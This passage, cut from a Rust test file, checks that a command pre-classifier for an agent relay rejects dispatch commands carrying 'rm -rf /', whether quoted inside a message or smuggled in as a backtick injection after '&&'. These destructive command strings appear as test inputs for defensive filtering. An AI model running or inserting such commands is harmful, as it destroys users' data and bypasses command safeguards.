        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_938_tier3_inside_quoted_message_still_rejected() {
        // TIER 3 check at line 117 still triggers on `rm -rf` substring
        // regardless of quoting (per Decision 2: TIER 3 keeps blanket semantics)
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch \"msg with rm -rf / inside quotes\"""#,
        );
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }

    #[test]
    fn test_938_compound_with_backtick_injection() {
        // Negative: backtick-wrapped command appended after the dispatch
        let msg = pilot_event_bash_raw(
            r#""mika ask --agent mika-arch --format json --verbose \"msg\" && `rm -rf /`""#,
        );
        assert_eq!(pre_classify_pilot_event(&msg, "mika-relay"), None);
    }
}
